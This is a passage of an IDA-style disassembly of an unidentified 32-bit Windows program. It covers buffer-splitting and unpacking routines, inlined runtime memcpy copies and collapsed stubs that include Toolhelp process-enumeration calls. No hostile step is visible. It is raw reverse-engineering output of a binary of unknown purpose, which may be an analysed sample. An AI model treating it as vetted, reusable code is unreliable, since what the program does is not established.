		cmp	eax, [ebp+arg_4]
		jb	short loc_407124

loc_40713B:				; CODE XREF: sub_4070D1+5Bj
		cmp	eax, [ebp+arg_4]
		jnb	short loc_40718A
		mov	ecx, eax

loc_407142:				; CODE XREF: sub_4070D1+7Ej
		mov	edx, [ebp+arg_0]
		cmp	byte ptr [ecx+edx], 0
		jnz	short loc_407151
		inc	ecx
		cmp	ecx, [ebp+arg_4]
		jb	short loc_407142

loc_407151:				; CODE XREF: sub_4070D1+78j
		mov	edx, ecx
		sub	edx, eax
		cmp	edx, 0Ah
		jnb	short loc_40716B

loc_40715A:				; CODE XREF: sub_4070D1+98j
		cmp	eax, ecx
		jnb	short loc_40711F
		mov	edx, [ebp+arg_0]
		mov	dl, [eax+edx]
		mov	[esi+ebx], dl
		inc	esi
		inc	eax
		jmp	short loc_40715A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40716B:				; CODE XREF: sub_4070D1+87j
		cmp	[ebp+var_8], 2710h
		jnb	short loc_407183
		inc	[ebp+var_8]
		mov	[edi-4], eax
		mov	[edi], edx
		add	edi, 8
		mov	eax, ecx
		jmp	short loc_40711F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_407183:				; CODE XREF: sub_4070D1+A1j
		mov	[ebp+var_4], esi
		xor	esi, esi
		jmp	short loc_4071D2
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40718A:				; CODE XREF: sub_4070D1+51j
					; sub_4070D1+6Dj
		mov	eax, [ebp+var_8]
		mov	[ebp+var_4], esi
		mov	edi, eax
		shl	edi, 3
		lea	ebx, [edi+esi+4]
		push	ebx
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	esi, eax
		mov	eax, [ebp+var_8]
		push	edi		; size_t
		mov	[esi], eax
		lea	eax, [ebp+var_1388C]
		push	eax		; void *
		lea	eax, [esi+4]
		push	eax		; void *
		call	_memcpy
		push	[ebp+var_4]	; size_t
		lea	eax, [edi+esi+4]
		push	[ebp+var_C]	; void *
		push	eax		; void *
		call	_memcpy
		mov	eax, [ebp+arg_8]
		add	esp, 1Ch
		mov	[eax], ebx
		mov	ebx, [ebp+var_C]

loc_4071D2:				; CODE XREF: sub_4070D1+B7j
		push	ebx
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		mov	eax, esi
		pop	edi

loc_4071DC:				; CODE XREF: sub_4070D1+2Bj
		pop	esi
		pop	ebx
		leave
		retn
sub_4070D1	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4071E0	proc near		; CODE XREF: sub_4058ED+AEp
					; sub_406E45+24p

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		mov	ebx, [ebp+arg_0]
		push	esi
		push	edi
		mov	eax, [ebx]
		xor	edx, edx
		mov	edi, eax
		lea	ecx, [ebx+4]
		shl	edi, 3
		mov	[ebp+var_4], edx
		mov	[ebp+var_C], ecx
		lea	esi, [edi+4]
		mov	[ebp+var_8], eax
		cmp	[ebp+arg_4], esi
		jnb	short loc_407210
		xor	eax, eax
		jmp	loc_4072AC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_407210:				; CODE XREF: sub_4071E0+27j
		test	eax, eax
		jbe	short loc_407237
		mov	esi, ecx
		mov	[ebp+arg_0], eax

loc_407219:				; CODE XREF: sub_4071E0+55j
		mov	ecx, [esi]
		cmp	edx, ecx
		jnb	short loc_407226
		sub	ecx, edx
		add	edx, ecx
		add	[ebp+var_4], ecx

loc_407226:				; CODE XREF: sub_4071E0+3Dj
		mov	eax, [esi+4]
		test	eax, eax
		jbe	short loc_40722F
		add	edx, eax

loc_40722F:				; CODE XREF: sub_4071E0+4Bj
		add	esi, 8
		dec	[ebp+arg_0]
		jnz	short loc_407219

loc_407237:				; CODE XREF: sub_4071E0+32j
		mov	eax, [ebp+arg_4]
		sub	eax, edi
		add	eax, 0FFFFFFFCh
		cmp	[ebp+var_4], eax
		mov	[ebp+arg_4], eax
		jnb	short loc_40724C
		sub	eax, [ebp+var_4]
		add	edx, eax

loc_40724C:				; CODE XREF: sub_4071E0+65j
		mov	eax, [ebp+arg_8]
		xor	esi, esi
		and	[ebp+var_4], esi
		push	edx
		mov	[eax], edx
		call	??2@YAPAXI@Z	; operator new(uint)
		lea	edi, [edi+ebx+4]
		mov	ebx, [ebp+var_8]
		test	ebx, ebx
		pop	ecx
		jbe	short loc_407296
		mov	ecx, [ebp+var_C]

loc_40726B:				; CODE XREF: sub_4071E0+9Cj
					; sub_4071E0+B4j
		cmp	esi, [ecx]
		jnb	short loc_40727E
		mov	edx, [ebp+var_4]
		mov	dl, [edx+edi]
		mov	[eax+esi], dl
		inc	esi
		inc	[ebp+var_4]
		jmp	short loc_40726B
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40727E:				; CODE XREF: sub_4071E0+8Dj
		xor	edx, edx
		cmp	[ecx+4], edx
		jbe	short loc_407290

loc_407285:				; CODE XREF: sub_4071E0+AEj
		and	byte ptr [eax+esi], 0
		inc	esi
		inc	edx
		cmp	edx, [ecx+4]
		jb	short loc_407285

loc_407290:				; CODE XREF: sub_4071E0+A3j
		add	ecx, 8
		dec	ebx
		jnz	short loc_40726B

loc_407296:				; CODE XREF: sub_4071E0+86j
		mov	ecx, [ebp+var_4]
		cmp	ecx, [ebp+arg_4]
		jnb	short loc_4072AC
		add	esi, eax

loc_4072A0:				; CODE XREF: sub_4071E0+CAj
		mov	dl, [ecx+edi]
		mov	[esi], dl
		inc	esi
		inc	ecx
		cmp	ecx, [ebp+arg_4]
		jb	short loc_4072A0

loc_4072AC:				; CODE XREF: sub_4071E0+2Bj
					; sub_4071E0+BCj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4071E0	endp

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 2
; [00000006 BYTES: COLLAPSED FUNCTION Module32First. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION CreateToolhelp32Snapshot.	PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION Process32Next. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION Process32First. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000084 BYTES: COLLAPSED FUNCTION _strcmp. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [00000007 BYTES: COLLAPSED FUNCTION _strcpy. PRESS KEYPAD "+"	TO EXPAND]
		align 10h
; [000000E0 BYTES: COLLAPSED FUNCTION _strcat. PRESS KEYPAD "+"	TO EXPAND]
; [0000007B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD "+"	TO EXPAND]
; [00000147 BYTES: COLLAPSED FUNCTION __splitpath. PRESS KEYPAD	"+" TO EXPAND]
; [000000CC BYTES: COLLAPSED FUNCTION _toupper.	PRESS KEYPAD "+" TO EXPAND]
; [000000CB BYTES: COLLAPSED FUNCTION _tolower.	PRESS KEYPAD "+" TO EXPAND]
; [00000052 BYTES: COLLAPSED FUNCTION _sprintf.	PRESS KEYPAD "+" TO EXPAND]
; [0000000B BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS KEYPAD "+"	TO EXPAND]
		align 10h

; void *__cdecl	memcpy(void *,const void *,size_t)
_memcpy:				; CODE XREF: sub_40280F+19Bp
					; sub_404CF1+129p ...
		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		mov	esi, [ebp+0Ch]
		mov	ecx, [ebp+10h]
		mov	edi, [ebp+8]
		mov	eax, ecx
		mov	edx, ecx
		add	eax, esi
		cmp	edi, esi
		jbe	short loc_407890
		cmp	edi, eax
		jb	loc_407A08

loc_407890:				; CODE XREF: .text:00407886j
		test	edi, 3
		jnz	short loc_4078AC
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short near ptr dword_4078CC
		rep movsd
		jmp	ds:off_4079B8[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4078AC:				; CODE XREF: .text:00407896j
		mov	eax, edi
		mov	edx, 3
		sub	ecx, 4
		jb	short loc_4078C4
		and	eax, 3
		add	ecx, eax
		jmp	ds:dword_4078D0[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4078C4:				; CODE XREF: .text:004078B6j
		jmp	ds:TrailUp0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
dword_4078CC	dd 4C8D24FFh		; CODE XREF: .text:004078A1j
dword_4078D0	dd 90004079h		; DATA XREF: .text:004078BDr
		dd offset dword_4078E0
		dd offset LeadUp2
		dd offset LeadUp3
dword_4078E0	dd 68AD123h, 468A0788h,	1478801h, 0C102468Ah, 478802E9h
					; DATA XREF: .text:004078D4o
		dd 3C68302h, 8303C783h,	0CC7208F9h, 24FFA5F3h, 4079B895h
		dd 498D00h
LeadUp2		dd 68AD123h, 468A0788h,	2E9C101h, 83014788h, 0C78302C6h
					; DATA XREF: .text:004078D8o
		dd 8F98302h, 0A5F3A672h, 0B89524FFh, 90004079h
LeadUp3		dd 68AD123h, 0C1460788h, 834702E9h, 8C7208F9h, 24FFA5F3h
					; DATA XREF: .text:004078DCo
		dd 4079B895h, 498D00h, 4079AFh,	40799Ch, 407994h, 40798Ch
		dd 407984h, 40797Ch, 407974h, 40796Ch
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindUp7:
		mov	eax, [esi+ecx*4-1Ch]
		mov	[edi+ecx*4-1Ch], eax

UnwindUp6:
		mov	eax, [esi+ecx*4-18h]
		mov	[edi+ecx*4-18h], eax

UnwindUp5:
		mov	eax, [esi+ecx*4-14h]
		mov	[edi+ecx*4-14h], eax

UnwindUp4:
		mov	eax, [esi+ecx*4-10h]
		mov	[edi+ecx*4-10h], eax

UnwindUp3:
		mov	eax, [esi+ecx*4-0Ch]
		mov	[edi+ecx*4-0Ch], eax

UnwindUp2:
		mov	eax, [esi+ecx*4-8]
		mov	[edi+ecx*4-8], eax

UnwindUp1:
		mov	eax, [esi+ecx*4-4]
		mov	[edi+ecx*4-4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax

UnwindUp0:
		jmp	ds:off_4079B8[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
off_4079B8	dd offset TrailUp0	; DATA XREF: .text:004078A5r
					; .text:UnwindUp0r
		dd offset TrailUp1
		dd offset TrailUp2
		dd offset TrailUp3
TrailUp0	dd 5E08458Bh		; CODE XREF: .text:004078A5j
					; DATA XREF: .text:loc_4078C4r	...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		pop	edi
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [0000000B BYTES: COLLAPSED FUNCTION TrailUp1.	PRESS KEYPAD "+" TO EXPAND]
		align 4
; [00000011 BYTES: COLLAPSED FUNCTION TrailUp2.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000017 BYTES: COLLAPSED FUNCTION TrailUp3.	PRESS KEYPAD "+" TO EXPAND]
		align 4

loc_407A08:				; CODE XREF: .text:0040788Aj
		lea	esi, [ecx+esi-4]
		lea	edi, [ecx+edi-4]
		test	edi, 3
		jnz	short loc_407A3C
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short loc_407A30
		std
		rep movsd
		cld
		jmp	ds:off_407B50[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

loc_407A30:				; CODE XREF: .text:00407A21j
					; .text:00407A78j ...
		neg	ecx
		jmp	ds:off_407B00[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

loc_407A3C:				; CODE XREF: .text:00407A16j
		mov	eax, edi
		mov	edx, 3
		cmp	ecx, 4
		jb	short near ptr dword_407A54
		and	eax, 3
		sub	ecx, eax
		jmp	ds:dword_407A58[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_407A54	dd 508D24FFh		; CODE XREF: .text:00407A46j
dword_407A58	dd 9000407Bh		; DATA XREF: .text:00407A4Dr
		dd offset loc_407A67+1
		dd offset LeadDown2
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		mov	al, 7Ah
		inc	eax

loc_407A67:				; DATA XREF: .text:00407A5Co
		add	[edx-2EDCFCBAh], cl
		mov	[edi+3], al
		dec	esi
		shr	ecx, 2
		dec	edi
		cmp	ecx, 8
		jb	short loc_407A30
		std
		rep movsd
		cld
		jmp	ds:off_407B50[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

LeadDown2:				; DATA XREF: .text:00407A60o
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		shr	ecx, 2
		mov	[edi+2], al
		sub	esi, 2
		sub	edi, 2
		cmp	ecx, 8
		jb	short loc_407A30
		std
		rep movsd
		cld
		jmp	ds:off_407B50[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

LeadDown3:
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	al, [esi+1]
		shr	ecx, 2
		mov	[edi+1], al
		sub	esi, 3
		sub	edi, 3
		cmp	ecx, 8
		jb	loc_407A30
		std
		rep movsd
		cld
		jmp	ds:off_407B50[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
		dd offset UnwindDown7
		dd offset UnwindDown6
		dd offset UnwindDown5
		dd offset UnwindDown4
		dd offset UnwindDown3
		dd offset UnwindDown2
		dd offset UnwindDown1
off_407B00	dd offset UnwindDown0	; DATA XREF: .text:00407A32r
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindDown7:				; DATA XREF: .text:00407AE4o
		mov	eax, [esi+ecx*4+1Ch]
		mov	[edi+ecx*4+1Ch], eax

UnwindDown6:				; DATA XREF: .text:00407AE8o
		mov	eax, [esi+ecx*4+18h]
		mov	[edi+ecx*4+18h], eax

UnwindDown5:				; DATA XREF: .text:00407AECo
		mov	eax, [esi+ecx*4+14h]
		mov	[edi+ecx*4+14h], eax

UnwindDown4:				; DATA XREF: .text:00407AF0o
		mov	eax, [esi+ecx*4+10h]
		mov	[edi+ecx*4+10h], eax

UnwindDown3:				; DATA XREF: .text:00407AF4o
		mov	eax, [esi+ecx*4+0Ch]
		mov	[edi+ecx*4+0Ch], eax

UnwindDown2:				; DATA XREF: .text:00407AF8o
		mov	eax, [esi+ecx*4+8]
		mov	[edi+ecx*4+8], eax

UnwindDown1:				; DATA XREF: .text:00407AFCo
		mov	eax, [esi+ecx*4+4]
		mov	[edi+ecx*4+4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax
; [0000005E BYTES: COLLAPSED FUNCTION UnwindDown0. PRESS KEYPAD	"+" TO EXPAND]

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_407BA5	proc near		; CODE XREF: sub_4046AB+17p

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	dword_411110, eax
		retn
sub_407BA5	endp

; [0000001E BYTES: COLLAPSED FUNCTION _rand. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD "+" TO EXPAND]
; [0000000E BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD "+" TO EXPAND]
; [00000034 BYTES: COLLAPSED FUNCTION _sscanf. PRESS KEYPAD "+"	TO EXPAND]
		align 10h

_memcpy_0:				; CODE XREF: sub_40308A+79p
					; sub_403133+77p ...
		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		mov	esi, [ebp+0Ch]
		mov	ecx, [ebp+10h]
		mov	edi, [ebp+8]
		mov	eax, ecx
		mov	edx, ecx
		add	eax, esi
		cmp	edi, esi
		jbe	short loc_407C70
		cmp	edi, eax
		jb	loc_407DE8

loc_407C70:				; CODE XREF: .text:00407C66j
		test	edi, 3
		jnz	short loc_407C8C
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short near ptr dword_407CAC
		rep movsd
		jmp	ds:off_407D98[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_407C8C:				; CODE XREF: .text:00407C76j
		mov	eax, edi
		mov	edx, 3
		sub	ecx, 4
		jb	short loc_407CA4
		and	eax, 3
		add	ecx, eax
		jmp	ds:dword_407CB0[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_407CA4:				; CODE XREF: .text:00407C96j
		jmp	ds:TrailUp0_0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
dword_407CAC	dd 2C8D24FFh		; CODE XREF: .text:00407C81j
dword_407CB0	dd 9000407Dh		; DATA XREF: .text:00407C9Dr
		dd offset dword_407CC0
		dd offset LeadUp2_0
		dd offset LeadUp3_0
dword_407CC0	dd 68AD123h, 468A0788h,	1478801h, 0C102468Ah, 478802E9h
					; DATA XREF: .text:00407CB4o
		dd 3C68302h, 8303C783h,	0CC7208F9h, 24FFA5F3h, 407D9895h
		dd 498D00h
LeadUp2_0	dd 68AD123h, 468A0788h,	2E9C101h, 83014788h, 0C78302C6h
					; DATA XREF: .text:00407CB8o
		dd 8F98302h, 0A5F3A672h, 989524FFh, 9000407Dh
LeadUp3_0	dd 68AD123h, 0C1460788h, 834702E9h, 8C7208F9h, 24FFA5F3h
					; DATA XREF: .text:00407CBCo
		dd 407D9895h, 498D00h, 407D8Fh,	407D7Ch, 407D74h, 407D6Ch
		dd 407D64h, 407D5Ch, 407D54h, 407D4Ch
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

UnwindUp7_0:
		mov	eax, [esi+ecx*4-1Ch]
		mov	[edi+ecx*4-1Ch], eax

UnwindUp6_0:
		mov	eax, [esi+ecx*4-18h]
		mov	[edi+ecx*4-18h], eax

UnwindUp5_0:
		mov	eax, [esi+ecx*4-14h]
		mov	[edi+ecx*4-14h], eax

UnwindUp4_0:
		mov	eax, [esi+ecx*4-10h]
		mov	[edi+ecx*4-10h], eax

UnwindUp3_0:
		mov	eax, [esi+ecx*4-0Ch]
		mov	[edi+ecx*4-0Ch], eax

UnwindUp2_0:
		mov	eax, [esi+ecx*4-8]
		mov	[edi+ecx*4-8], eax

UnwindUp1_0:
		mov	eax, [esi+ecx*4-4]
		mov	[edi+ecx*4-4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax

UnwindUp0_0:
		jmp	ds:off_407D98[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4
off_407D98	dd offset TrailUp0_0	; DATA XREF: .text:00407C85r
					; .text:UnwindUp0_0r
		dd offset TrailUp1_0
		dd offset TrailUp2_0
		dd offset TrailUp3_0
TrailUp0_0	dd 5E08458Bh		; CODE XREF: .text:00407C85j
					; DATA XREF: .text:loc_407CA4r	...
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		pop	edi
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h
; [0000000B BYTES: COLLAPSED FUNCTION TrailUp1_0. PRESS	KEYPAD "+" TO EXPAND]
		align 4
; [00000011 BYTES: COLLAPSED FUNCTION TrailUp2_0. PRESS	KEYPAD "+" TO EXPAND]
		align 10h
; [00000017 BYTES: COLLAPSED FUNCTION TrailUp3_0. PRESS	KEYPAD "+" TO EXPAND]
		align 4

loc_407DE8:				; CODE XREF: .text:00407C6Aj
		lea	esi, [ecx+esi-4]
		lea	edi, [ecx+edi-4]
		test	edi, 3
		jnz	short loc_407E1C
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short loc_407E10
		std
		rep movsd
		cld
		jmp	ds:off_407F30[edx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 10h

loc_407E10:				; CODE XREF: .text:00407E01j
					; .text:00407E58j ...
		neg	ecx
		jmp	ds:off_407EE0[ecx*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		align 4

loc_407E1C:				; CODE XREF: .text:00407DF6j
		mov	eax, edi
		mov	edx, 3
		cmp	ecx, 4
		jb	short near ptr dword_407E34
		and	eax, 3
		sub	ecx, eax
		jmp	ds:dword_407E38[eax*4]
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dword_407E34	dd 308D24FFh		; CODE XREF: .text:00407E26j
dword_407E38	dd 9000407Fh		; DATA XREF: .text:00407E2Dr
		dd offset loc_407E47+1
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
		push	9000407Eh
		jle	short loc_407E87

loc_407E47:				; DATA XREF: .text:00407E3Co
		add	[edx-2EDCFCBAh], cl
		mov	[edi+3], al
		dec	esi
		shr	ecx, 2
		dec	edi
		cmp	ecx, 8
		jb	short loc_407E10
		std
		rep movsd
		cld
		jmp	ds:off_407F30[edx*4]
